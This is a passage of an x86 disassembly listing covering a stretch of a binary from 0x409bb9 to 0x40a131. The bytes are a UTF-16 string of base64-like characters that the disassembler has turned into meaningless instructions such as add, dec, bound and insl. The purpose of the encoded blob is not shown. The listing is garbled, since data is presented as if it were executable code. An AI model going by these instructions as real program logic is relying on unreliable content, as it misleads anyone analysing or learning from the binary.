  409bb9:	00 76 00             	add    %dh,0x0(%esi)
  409bbc:	49                   	dec    %ecx
  409bbd:	00 62 00             	add    %ah,0x0(%edx)
  409bc0:	4e                   	dec    %esi
  409bc1:	00 5a 00             	add    %bl,0x0(%edx)
  409bc4:	53                   	push   %ebx
  409bc5:	00 77 00             	add    %dh,0x0(%edi)
  409bc8:	77 00                	ja     0x409bca
  409bca:	33 00                	xor    (%eax),%eax
  409bcc:	62 00                	bound  %eax,(%eax)
  409bce:	56                   	push   %esi
  409bcf:	00 77 00             	add    %dh,0x0(%edi)
  409bd2:	4a                   	dec    %edx
  409bd3:	00 57 00             	add    %dl,0x0(%edi)
  409bd6:	4e                   	dec    %esi
  409bd7:	00 51 00             	add    %dl,0x0(%ecx)
  409bda:	6d                   	insl   (%dx),%es:(%edi)
  409bdb:	00 71 00             	add    %dh,0x0(%ecx)
  409bde:	39 00                	cmp    %eax,(%eax)
  409be0:	47                   	inc    %edi
  409be1:	00 4e 00             	add    %cl,0x0(%esi)
  409be4:	4a                   	dec    %edx
  409be5:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  409be9:	00 36                	add    %dh,(%esi)
  409beb:	00 79 00             	add    %bh,0x0(%ecx)
  409bee:	78 00                	js     0x409bf0
  409bf0:	30 00                	xor    %al,(%eax)
  409bf2:	6d                   	insl   (%dx),%es:(%edi)
  409bf3:	00 72 00             	add    %dh,0x0(%edx)
  409bf6:	32 00                	xor    (%eax),%al
  409bf8:	36 00 44 00 31       	add    %al,%ss:0x31(%eax,%eax,1)
  409bfd:	00 6d 00             	add    %ch,0x0(%ebp)
  409c00:	37                   	aaa
  409c01:	00 57 00             	add    %dl,0x0(%edi)
  409c04:	77 00                	ja     0x409c06
  409c06:	65 00 64 00 2b       	add    %ah,%gs:0x2b(%eax,%eax,1)
  409c0b:	00 62 00             	add    %ah,0x0(%edx)
  409c0e:	6d                   	insl   (%dx),%es:(%edi)
  409c0f:	00 65 00             	add    %ah,0x0(%ebp)
  409c12:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  409c16:	41                   	inc    %ecx
  409c17:	00 51 00             	add    %dl,0x0(%ecx)
  409c1a:	72 00                	jb     0x409c1c
  409c1c:	72 00                	jb     0x409c1e
  409c1e:	57                   	push   %edi
  409c1f:	00 63 00             	add    %ah,0x0(%ebx)
  409c22:	4b                   	dec    %ebx
  409c23:	00 4e 00             	add    %cl,0x0(%esi)
  409c26:	34 00                	xor    $0x0,%al
  409c28:	2f                   	das
  409c29:	00 7a 00             	add    %bh,0x0(%edx)
  409c2c:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  409c30:	53                   	push   %ebx
  409c31:	00 5a 00             	add    %bl,0x0(%edx)
  409c34:	2f                   	das
  409c35:	00 2b                	add    %ch,(%ebx)
  409c37:	00 56 00             	add    %dl,0x0(%esi)
  409c3a:	58                   	pop    %eax
  409c3b:	00 6a 00             	add    %ch,0x0(%edx)
  409c3e:	5a                   	pop    %edx
  409c3f:	00 50 00             	add    %dl,0x0(%eax)
  409c42:	4c                   	dec    %esp
  409c43:	00 36                	add    %dh,(%esi)
  409c45:	00 57 00             	add    %dl,0x0(%edi)
  409c48:	70 00                	jo     0x409c4a
  409c4a:	73 00                	jae    0x409c4c
  409c4c:	55                   	push   %ebp
  409c4d:	00 6b 00             	add    %ch,0x0(%ebx)
  409c50:	52                   	push   %edx
  409c51:	00 52 00             	add    %dl,0x0(%edx)
  409c54:	4c                   	dec    %esp
  409c55:	00 53 00             	add    %dl,0x0(%ebx)
  409c58:	39 00                	cmp    %eax,(%eax)
  409c5a:	59                   	pop    %ecx
  409c5b:	00 4a 00             	add    %cl,0x0(%edx)
  409c5e:	34 00                	xor    $0x0,%al
  409c60:	6f                   	outsl  %ds:(%esi),(%dx)
  409c61:	00 2b                	add    %ch,(%ebx)
  409c63:	00 68 00             	add    %ch,0x0(%eax)
  409c66:	55                   	push   %ebp
  409c67:	00 56 00             	add    %dl,0x0(%esi)
  409c6a:	56                   	push   %esi
  409c6b:	00 50 00             	add    %dl,0x0(%eax)
  409c6e:	6e                   	outsb  %ds:(%esi),(%dx)
  409c6f:	00 37                	add    %dh,(%edi)
  409c71:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
  409c75:	00 38                	add    %bh,(%eax)
  409c77:	00 69 00             	add    %ch,0x0(%ecx)
  409c7a:	44                   	inc    %esp
  409c7b:	00 42 00             	add    %al,0x0(%edx)
  409c7e:	76 00                	jbe    0x409c80
  409c80:	73 00                	jae    0x409c82
  409c82:	6f                   	outsl  %ds:(%esi),(%dx)
  409c83:	00 75 00             	add    %dh,0x0(%ebp)
  409c86:	53                   	push   %ebx
  409c87:	00 41 00             	add    %al,0x0(%ecx)
  409c8a:	4b                   	dec    %ebx
  409c8b:	00 62 00             	add    %ah,0x0(%edx)
  409c8e:	34 00                	xor    $0x0,%al
  409c90:	72 00                	jb     0x409c92
  409c92:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  409c96:	2f                   	das
  409c97:	00 68 00             	add    %ch,0x0(%eax)
  409c9a:	77 00                	ja     0x409c9c
  409c9c:	32 00                	xor    (%eax),%al
  409c9e:	73 00                	jae    0x409ca0
  409ca0:	37                   	aaa
  409ca1:	00 55 00             	add    %dl,0x0(%ebp)
  409ca4:	32 00                	xor    (%eax),%al
  409ca6:	55                   	push   %ebp
  409ca7:	00 45 00             	add    %al,0x0(%ebp)
  409caa:	50                   	push   %eax
  409cab:	00 6d 00             	add    %ch,0x0(%ebp)
  409cae:	2b 00                	sub    (%eax),%eax
  409cb0:	6d                   	insl   (%dx),%es:(%edi)
  409cb1:	00 30                	add    %dh,(%eax)
  409cb3:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  409cb7:	00 76 00             	add    %dh,0x0(%esi)
  409cba:	6c                   	insb   (%dx),%es:(%edi)
  409cbb:	00 37                	add    %dh,(%edi)
  409cbd:	00 42 00             	add    %al,0x0(%edx)
  409cc0:	6d                   	insl   (%dx),%es:(%edi)
  409cc1:	00 43 00             	add    %al,0x0(%ebx)
  409cc4:	5a                   	pop    %edx
  409cc5:	00 76 00             	add    %dh,0x0(%esi)
  409cc8:	61                   	popa
  409cc9:	00 4a 00             	add    %cl,0x0(%edx)
  409ccc:	74 00                	je     0x409cce
  409cce:	78 00                	js     0x409cd0
  409cd0:	48                   	dec    %eax
  409cd1:	00 49 00             	add    %cl,0x0(%ecx)
  409cd4:	58                   	pop    %eax
  409cd5:	00 32                	add    %dh,(%edx)
  409cd7:	00 59 00             	add    %bl,0x0(%ecx)
  409cda:	6d                   	insl   (%dx),%es:(%edi)
  409cdb:	00 63 00             	add    %ah,0x0(%ebx)
  409cde:	2f                   	das
  409cdf:	00 6a 00             	add    %ch,0x0(%edx)
  409ce2:	50                   	push   %eax
  409ce3:	00 35 00 73 00 75    	add    %dh,0x75007300
  409ce9:	00 74 00 46          	add    %dh,0x46(%eax,%eax,1)
  409ced:	00 39                	add    %bh,(%ecx)
  409cef:	00 46 00             	add    %al,0x0(%esi)
  409cf2:	74 00                	je     0x409cf4
  409cf4:	71 00                	jno    0x409cf6
  409cf6:	76 00                	jbe    0x409cf8
  409cf8:	77 00                	ja     0x409cfa
  409cfa:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  409cfe:	57                   	push   %edi
  409cff:	00 4a 00             	add    %cl,0x0(%edx)
  409d02:	55                   	push   %ebp
  409d03:	00 37                	add    %dh,(%edi)
  409d05:	00 50 00             	add    %dl,0x0(%eax)
  409d08:	59                   	pop    %ecx
  409d09:	00 65 00             	add    %ah,0x0(%ebp)
  409d0c:	62 00                	bound  %eax,(%eax)
  409d0e:	44                   	inc    %esp
  409d0f:	00 52 00             	add    %dl,0x0(%edx)
  409d12:	71 00                	jno    0x409d14
  409d14:	4d                   	dec    %ebp
  409d15:	00 78 00             	add    %bh,0x0(%eax)
  409d18:	6d                   	insl   (%dx),%es:(%edi)
  409d19:	00 67 00             	add    %ah,0x0(%edi)
  409d1c:	48                   	dec    %eax
  409d1d:	00 43 00             	add    %al,0x0(%ebx)
  409d20:	62 00                	bound  %eax,(%eax)
  409d22:	73 00                	jae    0x409d24
  409d24:	6b 00 70             	imul   $0x70,(%eax),%eax
  409d27:	00 4d 00             	add    %cl,0x0(%ebp)
  409d2a:	63 00                	arpl   %eax,(%eax)
  409d2c:	45                   	inc    %ebp
  409d2d:	00 6b 00             	add    %ch,0x0(%ebx)
  409d30:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  409d34:	6f                   	outsl  %ds:(%esi),(%dx)
  409d35:	00 36                	add    %dh,(%esi)
  409d37:	00 32                	add    %dh,(%edx)
  409d39:	00 55 00             	add    %dl,0x0(%ebp)
  409d3c:	73 00                	jae    0x409d3e
  409d3e:	55                   	push   %ebp
  409d3f:	00 39                	add    %bh,(%ecx)
  409d41:	00 65 00             	add    %ah,0x0(%ebp)
  409d44:	6e                   	outsb  %ds:(%esi),(%dx)
  409d45:	00 39                	add    %bh,(%ecx)
  409d47:	00 53 00             	add    %dl,0x0(%ebx)
  409d4a:	45                   	inc    %ebp
  409d4b:	00 67 00             	add    %ah,0x0(%edi)
  409d4e:	68 00 58 00 6e       	push   $0x6e005800
  409d53:	00 69 00             	add    %ch,0x0(%ecx)
  409d56:	73 00                	jae    0x409d58
  409d58:	71 00                	jno    0x409d5a
  409d5a:	4d                   	dec    %ebp
  409d5b:	00 48 00             	add    %cl,0x0(%eax)
  409d5e:	68 00 67 00 62       	push   $0x62006700
  409d63:	00 32                	add    %dh,(%edx)
  409d65:	00 41 00             	add    %al,0x0(%ecx)
  409d68:	61                   	popa
  409d69:	00 5a 00             	add    %bl,0x0(%edx)
  409d6c:	7a 00                	jp     0x409d6e
  409d6e:	4a                   	dec    %edx
  409d6f:	00 62 00             	add    %ah,0x0(%edx)
  409d72:	46                   	inc    %esi
  409d73:	00 41 00             	add    %al,0x0(%ecx)
  409d76:	63 00                	arpl   %eax,(%eax)
  409d78:	42                   	inc    %edx
  409d79:	00 69 00             	add    %ch,0x0(%ecx)
  409d7c:	72 00                	jb     0x409d7e
  409d7e:	69 00 73 00 47 00    	imul   $0x470073,(%eax),%eax
  409d84:	46                   	inc    %esi
  409d85:	00 51 00             	add    %dl,0x0(%ecx)
  409d88:	77 00                	ja     0x409d8a
  409d8a:	42                   	inc    %edx
  409d8b:	00 63 00             	add    %ah,0x0(%ebx)
  409d8e:	7a 00                	jp     0x409d90
  409d90:	4b                   	dec    %ebx
  409d91:	00 35 00 53 00 56    	add    %dh,0x56005300
  409d97:	00 36                	add    %dh,(%esi)
  409d99:	00 58 00             	add    %bl,0x0(%eax)
  409d9c:	49                   	dec    %ecx
  409d9d:	00 65 00             	add    %ah,0x0(%ebp)
  409da0:	6f                   	outsl  %ds:(%esi),(%dx)
  409da1:	00 76 00             	add    %dh,0x0(%esi)
  409da4:	48                   	dec    %eax
  409da5:	00 7a 00             	add    %bh,0x0(%edx)
  409da8:	7a 00                	jp     0x409daa
  409daa:	54                   	push   %esp
  409dab:	00 31                	add    %dh,(%ecx)
  409dad:	00 50 00             	add    %dl,0x0(%eax)
  409db0:	62 00                	bound  %eax,(%eax)
  409db2:	48                   	dec    %eax
  409db3:	00 38                	add    %bh,(%eax)
  409db5:	00 6f 00             	add    %ch,0x0(%edi)
  409db8:	63 00                	arpl   %eax,(%eax)
  409dba:	59                   	pop    %ecx
  409dbb:	00 34 00             	add    %dh,(%eax,%eax,1)
  409dbe:	4b                   	dec    %ebx
  409dbf:	00 6e 00             	add    %ch,0x0(%esi)
  409dc2:	64 00 33             	add    %dh,%fs:(%ebx)
  409dc5:	00 4d 00             	add    %cl,0x0(%ebp)
  409dc8:	72 00                	jb     0x409dca
  409dca:	6a 00                	push   $0x0
  409dcc:	34 00                	xor    $0x0,%al
  409dce:	32 00                	xor    (%eax),%al
  409dd0:	57                   	push   %edi
  409dd1:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  409dd5:	00 36                	add    %dh,(%esi)
  409dd7:	00 77 00             	add    %dh,0x0(%edi)
  409dda:	48                   	dec    %eax
  409ddb:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  409ddf:	00 55 00             	add    %dl,0x0(%ebp)
  409de2:	6b 00 74             	imul   $0x74,(%eax),%eax
  409de5:	00 79 00             	add    %bh,0x0(%ecx)
  409de8:	6f                   	outsl  %ds:(%esi),(%dx)
  409de9:	00 33                	add    %dh,(%ebx)
  409deb:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  409def:	00 65 00             	add    %ah,0x0(%ebp)
  409df2:	72 00                	jb     0x409df4
  409df4:	34 00                	xor    $0x0,%al
  409df6:	71 00                	jno    0x409df8
  409df8:	51                   	push   %ecx
  409df9:	00 6f 00             	add    %ch,0x0(%edi)
  409dfc:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  409e00:	75 00                	jne    0x409e02
  409e02:	58                   	pop    %eax
  409e03:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  409e07:	00 62 00             	add    %ah,0x0(%edx)
  409e0a:	6f                   	outsl  %ds:(%esi),(%dx)
  409e0b:	00 35 00 46 00 6f    	add    %dh,0x6f004600
  409e11:	00 48 00             	add    %cl,0x0(%eax)
  409e14:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  409e18:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  409e1c:	31 00                	xor    %eax,(%eax)
  409e1e:	6e                   	outsb  %ds:(%esi),(%dx)
  409e1f:	00 5a 00             	add    %bl,0x0(%edx)
  409e22:	55                   	push   %ebp
  409e23:	00 5a 00             	add    %bl,0x0(%edx)
  409e26:	2b 00                	sub    (%eax),%eax
  409e28:	70 00                	jo     0x409e2a
  409e2a:	5a                   	pop    %edx
  409e2b:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  409e2f:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e32:	42                   	inc    %edx
  409e33:	00 6f 00             	add    %ch,0x0(%edi)
  409e36:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409e3a:	35 00 43 00 6e       	xor    $0x6e004300,%eax
  409e3f:	00 4d 00             	add    %cl,0x0(%ebp)
  409e42:	73 00                	jae    0x409e44
  409e44:	35 00 38 00 56       	xor    $0x56003800,%eax
  409e49:	00 75 00             	add    %dh,0x0(%ebp)
  409e4c:	7a 00                	jp     0x409e4e
  409e4e:	35 00 6d 00 4f       	xor    $0x4f006d00,%eax
  409e53:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
  409e57:	00 38                	add    %bh,(%eax)
  409e59:	00 65 00             	add    %ah,0x0(%ebp)
  409e5c:	6b 00 74             	imul   $0x74,(%eax),%eax
  409e5f:	00 6f 00             	add    %ch,0x0(%edi)
  409e62:	33 00                	xor    (%eax),%eax
  409e64:	4d                   	dec    %ebp
  409e65:	00 6b 00             	add    %ch,0x0(%ebx)
  409e68:	76 00                	jbe    0x409e6a
  409e6a:	35 00 77 00 48       	xor    $0x48007700,%eax
  409e6f:	00 47 00             	add    %al,0x0(%edi)
  409e72:	30 00                	xor    %al,(%eax)
  409e74:	2f                   	das
  409e75:	00 67 00             	add    %ah,0x0(%edi)
  409e78:	30 00                	xor    %al,(%eax)
  409e7a:	7a 00                	jp     0x409e7c
  409e7c:	31 00                	xor    %eax,(%eax)
  409e7e:	34 00                	xor    $0x0,%al
  409e80:	4b                   	dec    %ebx
  409e81:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  409e85:	00 71 00             	add    %dh,0x0(%ecx)
  409e88:	57                   	push   %edi
  409e89:	00 55 00             	add    %dl,0x0(%ebp)
  409e8c:	69 00 53 00 4d 00    	imul   $0x4d0053,(%eax),%eax
  409e92:	45                   	inc    %ebp
  409e93:	00 46 00             	add    %al,0x0(%esi)
  409e96:	61                   	popa
  409e97:	00 4c 00 63          	add    %cl,0x63(%eax,%eax,1)
  409e9b:	00 78 00             	add    %bh,0x0(%eax)
  409e9e:	5a                   	pop    %edx
  409e9f:	00 37                	add    %dh,(%edi)
  409ea1:	00 70 00             	add    %dh,0x0(%eax)
  409ea4:	30 00                	xor    %al,(%eax)
  409ea6:	6b 00 49             	imul   $0x49,(%eax),%eax
  409ea9:	00 32                	add    %dh,(%edx)
  409eab:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409eaf:	00 71 00             	add    %dh,0x0(%ecx)
  409eb2:	38 00                	cmp    %al,(%eax)
  409eb4:	67 00 6f 00          	add    %ch,0x0(%bx)
  409eb8:	61                   	popa
  409eb9:	00 4d 00             	add    %cl,0x0(%ebp)
  409ebc:	42                   	inc    %edx
  409ebd:	00 48 00             	add    %cl,0x0(%eax)
  409ec0:	59                   	pop    %ecx
  409ec1:	00 38                	add    %bh,(%eax)
  409ec3:	00 53 00             	add    %dl,0x0(%ebx)
  409ec6:	41                   	inc    %ecx
  409ec7:	00 57 00             	add    %dl,0x0(%edi)
  409eca:	4c                   	dec    %esp
  409ecb:	00 30                	add    %dh,(%eax)
  409ecd:	00 79 00             	add    %bh,0x0(%ecx)
  409ed0:	67 00 64 00          	add    %ah,0x0(%si)
  409ed4:	6f                   	outsl  %ds:(%esi),(%dx)
  409ed5:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  409ed9:	00 76 00             	add    %dh,0x0(%esi)
  409edc:	4d                   	dec    %ebp
  409edd:	00 43 00             	add    %al,0x0(%ebx)
  409ee0:	74 00                	je     0x409ee2
  409ee2:	42                   	inc    %edx
  409ee3:	00 50 00             	add    %dl,0x0(%eax)
  409ee6:	54                   	push   %esp
  409ee7:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  409eeb:	00 78 00             	add    %bh,0x0(%eax)
  409eee:	47                   	inc    %edi
  409eef:	00 72 00             	add    %dh,0x0(%edx)
  409ef2:	52                   	push   %edx
  409ef3:	00 45 00             	add    %al,0x0(%ebp)
  409ef6:	62 00                	bound  %eax,(%eax)
  409ef8:	77 00                	ja     0x409efa
  409efa:	54                   	push   %esp
  409efb:	00 68 00             	add    %ch,0x0(%eax)
  409efe:	76 00                	jbe    0x409f00
  409f00:	67 00 67 00          	add    %ah,0x0(%bx)
  409f04:	72 00                	jb     0x409f06
  409f06:	41                   	inc    %ecx
  409f07:	00 71 00             	add    %dh,0x0(%ecx)
  409f0a:	79 00                	jns    0x409f0c
  409f0c:	62 00                	bound  %eax,(%eax)
  409f0e:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  409f12:	61                   	popa
  409f13:	00 6a 00             	add    %ch,0x0(%edx)
  409f16:	2b 00                	sub    (%eax),%eax
  409f18:	66 00 58 00          	data16 add %bl,0x0(%eax)
  409f1c:	71 00                	jno    0x409f1e
  409f1e:	71 00                	jno    0x409f20
  409f20:	4e                   	dec    %esi
  409f21:	00 5a 00             	add    %bl,0x0(%edx)
  409f24:	42                   	inc    %edx
  409f25:	00 46 00             	add    %al,0x0(%esi)
  409f28:	47                   	inc    %edi
  409f29:	00 6e 00             	add    %ch,0x0(%esi)
  409f2c:	56                   	push   %esi
  409f2d:	00 69 00             	add    %ch,0x0(%ecx)
  409f30:	6e                   	outsb  %ds:(%esi),(%dx)
  409f31:	00 55 00             	add    %dl,0x0(%ebp)
  409f34:	48                   	dec    %eax
  409f35:	00 62 00             	add    %ah,0x0(%edx)
  409f38:	2f                   	das
  409f39:	00 6e 00             	add    %ch,0x0(%esi)
  409f3c:	4c                   	dec    %esp
  409f3d:	00 49 00             	add    %cl,0x0(%ecx)
  409f40:	53                   	push   %ebx
  409f41:	00 79 00             	add    %bh,0x0(%ecx)
  409f44:	6a 00                	push   $0x0
  409f46:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  409f4a:	46                   	inc    %esi
  409f4b:	00 4e 00             	add    %cl,0x0(%esi)
  409f4e:	45                   	inc    %ebp
  409f4f:	00 4e 00             	add    %cl,0x0(%esi)
  409f52:	65 00 2b             	add    %ch,%gs:(%ebx)
  409f55:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409f59:	00 4a 00             	add    %cl,0x0(%edx)
  409f5c:	31 00                	xor    %eax,(%eax)
  409f5e:	4c                   	dec    %esp
  409f5f:	00 75 00             	add    %dh,0x0(%ebp)
  409f62:	44                   	inc    %esp
  409f63:	00 56 00             	add    %dl,0x0(%esi)
  409f66:	74 00                	je     0x409f68
  409f68:	57                   	push   %edi
  409f69:	00 43 00             	add    %al,0x0(%ebx)
  409f6c:	38 00                	cmp    %al,(%eax)
  409f6e:	49                   	dec    %ecx
  409f6f:	00 33                	add    %dh,(%ebx)
  409f71:	00 51 00             	add    %dl,0x0(%ecx)
  409f74:	45                   	inc    %ebp
  409f75:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  409f79:	00 4c 00 7a          	add    %cl,0x7a(%eax,%eax,1)
  409f7d:	00 41 00             	add    %al,0x0(%ecx)
  409f80:	75 00                	jne    0x409f82
  409f82:	55                   	push   %ebp
  409f83:	00 76 00             	add    %dh,0x0(%esi)
  409f86:	69 00 67 00 2f 00    	imul   $0x2f0067,(%eax),%eax
  409f8c:	68 00 55 00 47       	push   $0x47005500
  409f91:	00 70 00             	add    %dh,0x0(%eax)
  409f94:	58                   	pop    %eax
  409f95:	00 79 00             	add    %bh,0x0(%ecx)
  409f98:	35 00 73 00 58       	xor    $0x58007300,%eax
  409f9d:	00 51 00             	add    %dl,0x0(%ecx)
  409fa0:	71 00                	jno    0x409fa2
  409fa2:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  409fa6:	7a 00                	jp     0x409fa8
  409fa8:	68 00 79 00 35       	push   $0x35007900
  409fad:	00 69 00             	add    %ch,0x0(%ecx)
  409fb0:	45                   	inc    %ebp
  409fb1:	00 75 00             	add    %dh,0x0(%ebp)
  409fb4:	73 00                	jae    0x409fb6
  409fb6:	69 00 68 00 63 00    	imul   $0x630068,(%eax),%eax
  409fbc:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  409fc0:	67 00 74 00          	add    %dh,0x0(%si)
  409fc4:	37                   	aaa
  409fc5:	00 6e 00             	add    %ch,0x0(%esi)
  409fc8:	35 00 36 00 42       	xor    $0x42003600,%eax
  409fcd:	00 58 00             	add    %bl,0x0(%eax)
  409fd0:	35 00 54 00 59       	xor    $0x59005400,%eax
  409fd5:	00 53 00             	add    %dl,0x0(%ebx)
  409fd8:	37                   	aaa
  409fd9:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  409fdd:	00 69 00             	add    %ch,0x0(%ecx)
  409fe0:	38 00                	cmp    %al,(%eax)
  409fe2:	6f                   	outsl  %ds:(%esi),(%dx)
  409fe3:	00 57 00             	add    %dl,0x0(%edi)
  409fe6:	50                   	push   %eax
  409fe7:	00 48 00             	add    %cl,0x0(%eax)
  409fea:	58                   	pop    %eax
  409feb:	00 4a 00             	add    %cl,0x0(%edx)
  409fee:	38 00                	cmp    %al,(%eax)
  409ff0:	43                   	inc    %ebx
  409ff1:	00 6a 00             	add    %ch,0x0(%edx)
  409ff4:	76 00                	jbe    0x409ff6
  409ff6:	4b                   	dec    %ebx
  409ff7:	00 65 00             	add    %ah,0x0(%ebp)
  409ffa:	4c                   	dec    %esp
  409ffb:	00 79 00             	add    %bh,0x0(%ecx)
  409ffe:	61                   	popa
  409fff:	00 63 00             	add    %ah,0x0(%ebx)
  40a002:	61                   	popa
  40a003:	00 56 00             	add    %dl,0x0(%esi)
  40a006:	4d                   	dec    %ebp
  40a007:	00 30                	add    %dh,(%eax)
  40a009:	00 35 00 37 00 77    	add    %dh,0x77003700
  40a00f:	00 36                	add    %dh,(%esi)
  40a011:	00 37                	add    %dh,(%edi)
  40a013:	00 56 00             	add    %dl,0x0(%esi)
  40a016:	68 00 74 00 6e       	push   $0x6e007400
  40a01b:	00 72 00             	add    %dh,0x0(%edx)
  40a01e:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  40a022:	73 00                	jae    0x40a024
  40a024:	37                   	aaa
  40a025:	00 35 00 4f 00 69    	add    %dh,0x69004f00
  40a02b:	00 48 00             	add    %cl,0x0(%eax)
  40a02e:	7a 00                	jp     0x40a030
  40a030:	48                   	dec    %eax
  40a031:	00 68 00             	add    %ch,0x0(%eax)
  40a034:	69 00 56 00 79 00    	imul   $0x790056,(%eax),%eax
  40a03a:	7a 00                	jp     0x40a03c
  40a03c:	74 00                	je     0x40a03e
  40a03e:	66 00 48 00          	data16 add %cl,0x0(%eax)
  40a042:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  40a046:	59                   	pop    %ecx
  40a047:	00 48 00             	add    %cl,0x0(%eax)
  40a04a:	69 00 4b 00 66 00    	imul   $0x66004b,(%eax),%eax
  40a050:	32 00                	xor    (%eax),%al
  40a052:	79 00                	jns    0x40a054
  40a054:	2b 00                	sub    (%eax),%eax
  40a056:	4a                   	dec    %edx
  40a057:	00 6b 00             	add    %ch,0x0(%ebx)
  40a05a:	71 00                	jno    0x40a05c
  40a05c:	72 00                	jb     0x40a05e
  40a05e:	4d                   	dec    %ebp
  40a05f:	00 35 00 71 00 33    	add    %dh,0x33007100
  40a065:	00 47 00             	add    %al,0x0(%edi)
  40a068:	6a 00                	push   $0x0
  40a06a:	64 00 2f             	add    %ch,%fs:(%edi)
  40a06d:	00 76 00             	add    %dh,0x0(%esi)
  40a070:	73 00                	jae    0x40a072
  40a072:	6c                   	insb   (%dx),%es:(%edi)
  40a073:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40a077:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  40a07b:	00 43 00             	add    %al,0x0(%ebx)
  40a07e:	42                   	inc    %edx
  40a07f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a082:	35 00 32 00 68       	xor    $0x68003200,%eax
  40a087:	00 75 00             	add    %dh,0x0(%ebp)
  40a08a:	4f                   	dec    %edi
  40a08b:	00 36                	add    %dh,(%esi)
  40a08d:	00 58 00             	add    %bl,0x0(%eax)
  40a090:	38 00                	cmp    %al,(%eax)
  40a092:	33 00                	xor    (%eax),%eax
  40a094:	68 00 67 00 48       	push   $0x48006700
  40a099:	00 78 00             	add    %bh,0x0(%eax)
  40a09c:	70 00                	jo     0x40a09e
  40a09e:	51                   	push   %ecx
  40a09f:	00 66 00             	add    %ah,0x0(%esi)
  40a0a2:	6d                   	insl   (%dx),%es:(%edi)
  40a0a3:	00 6a 00             	add    %ch,0x0(%edx)
  40a0a6:	45                   	inc    %ebp
  40a0a7:	00 6b 00             	add    %ch,0x0(%ebx)
  40a0aa:	47                   	inc    %edi
  40a0ab:	00 32                	add    %dh,(%edx)
  40a0ad:	00 55 00             	add    %dl,0x0(%ebp)
  40a0b0:	7a 00                	jp     0x40a0b2
  40a0b2:	2b 00                	sub    (%eax),%eax
  40a0b4:	6a 00                	push   $0x0
  40a0b6:	6b 00 69             	imul   $0x69,(%eax),%eax
  40a0b9:	00 58 00             	add    %bl,0x0(%eax)
  40a0bc:	52                   	push   %edx
  40a0bd:	00 38                	add    %bh,(%eax)
  40a0bf:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a0c2:	4a                   	dec    %edx
  40a0c3:	00 47 00             	add    %al,0x0(%edi)
  40a0c6:	34 00                	xor    $0x0,%al
  40a0c8:	37                   	aaa
  40a0c9:	00 43 00             	add    %al,0x0(%ebx)
  40a0cc:	48                   	dec    %eax
  40a0cd:	00 69 00             	add    %ch,0x0(%ecx)
  40a0d0:	37                   	aaa
  40a0d1:	00 39                	add    %bh,(%ecx)
  40a0d3:	00 4b 00             	add    %cl,0x0(%ebx)
  40a0d6:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40a0da:	56                   	push   %esi
  40a0db:	00 63 00             	add    %ah,0x0(%ebx)
  40a0de:	74 00                	je     0x40a0e0
  40a0e0:	2f                   	das
  40a0e1:	00 38                	add    %bh,(%eax)
  40a0e3:	00 2b                	add    %ch,(%ebx)
  40a0e5:	00 58 00             	add    %bl,0x0(%eax)
  40a0e8:	6b 00 76             	imul   $0x76,(%eax),%eax
  40a0eb:	00 76 00             	add    %dh,0x0(%esi)
  40a0ee:	79 00                	jns    0x40a0f0
  40a0f0:	4f                   	dec    %edi
  40a0f1:	00 70 00             	add    %dh,0x0(%eax)
  40a0f4:	71 00                	jno    0x40a0f6
  40a0f6:	41                   	inc    %ecx
  40a0f7:	00 30                	add    %dh,(%eax)
  40a0f9:	00 4e 00             	add    %cl,0x0(%esi)
  40a0fc:	4b                   	dec    %ebx
  40a0fd:	00 51 00             	add    %dl,0x0(%ecx)
  40a100:	6b 00 57             	imul   $0x57,(%eax),%eax
  40a103:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40a107:	00 46 00             	add    %al,0x0(%esi)
  40a10a:	4c                   	dec    %esp
  40a10b:	00 72 00             	add    %dh,0x0(%edx)
  40a10e:	76 00                	jbe    0x40a110
  40a110:	75 00                	jne    0x40a112
  40a112:	57                   	push   %edi
  40a113:	00 56 00             	add    %dl,0x0(%esi)
  40a116:	46                   	inc    %esi
  40a117:	00 43 00             	add    %al,0x0(%ebx)
  40a11a:	37                   	aaa
  40a11b:	00 5a 00             	add    %bl,0x0(%edx)
  40a11e:	39 00                	cmp    %eax,(%eax)
  40a120:	6a 00                	push   $0x0
  40a122:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40a125:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  40a129:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a12c:	32 00                	xor    (%eax),%al
  40a12e:	55                   	push   %ebp
  40a12f:	00 30                	add    %dh,(%eax)
  40a131:	00 4f 00             	add    %cl,0x0(%edi)
